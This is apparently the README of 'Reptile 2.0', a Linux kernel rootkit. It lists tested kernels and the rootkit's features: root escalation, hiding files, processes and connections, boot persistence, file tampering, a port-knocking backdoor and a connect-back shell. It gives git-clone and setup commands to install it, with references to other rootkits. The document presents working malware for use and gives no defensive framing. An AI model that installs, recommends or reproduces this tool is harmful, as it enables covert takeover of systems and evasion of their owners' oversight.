# Reptile 2.0

<img align="left" src="https://imgur.com/nqujOlz.png">

<br><br><br><br><br>
<br><br><br><br><br>

## Tested on

**Debian 9**: 4.9.0-8-amd64<br>
**Ubuntu 18.04.1 LTS**: 4.15.0-38-generic<br>
**Kali Linux**: 4.18.0-kali2-amd64<br>
**Centos 7**: 3.10.0-862.3.2.el7.x86_64<br>
**Centos 6.10**: 2.6.32-754.6.3.el6.x86_64

## Features

- Give root to unprivileged users
- Hide files and directories
- Hide processes
- Hide himself
- Hide TCP/IP connections
- Hidden boot persistence
- File content tampering
- Some obfuscation techniques
- ICMP/UDP/TCP port-knocking backdoor
- Full TTY/PTY shell with file transfer
- Client to handle Reptile Shell
- Shell connect back each X times (not default)
   
## Install
```
apt-get install linux-headers-$(uname -r)
perl -MCPAN -e "install String::Unescape"
git clone https://github.com/f0rb1dd3n/Reptile.git
cd Reptile
./setup.sh install
```
## Uninstall
```
./setup.sh remove
```
## Usage

See [Wiki](https://github.com/f0rb1dd3n/Reptile/wiki/Usage) to usage details.

## Warning

Some functions of this module is based on another rootkits. Please see the references!

## References

- “[LKM HACKING](http://www.ouah.org/LKM_HACKING.html)”, The Hackers Choice (THC), 1999;
- https://github.com/milabs
- https://github.com/mncoppola/suterusu
- https://github.com/m0nad/Diamorphine.git
- https://github.com/David-Reguera-Garcia-Dreg/enyelkm.git
- https://github.com/creaktive/tsh
- http://www.drkns.net/kernel-who-does-magic/
- https://github.com/brenns10/lsh

## Thanks

Special thanks to my friend [Ilya V. Matveychikov](https://github.com/milabs) for the [KHOOK](https://github.com/milabs/khook) framework and [kmatryoshka](https://github.com/milabs/kmatryoshka) loader.

## Disclaimer

If you wanna more information, send me an e-mail: f0rb1dd3n@tuta.io

<br>
<p align="center">
   <img src="http://2.bp.blogspot.com/-OMozG1JNxic/VQxKMfiU2EI/AAAAAAAAOQM/_suBsIa9O7c/s1600/Reptile%2B6.gif">
</p>
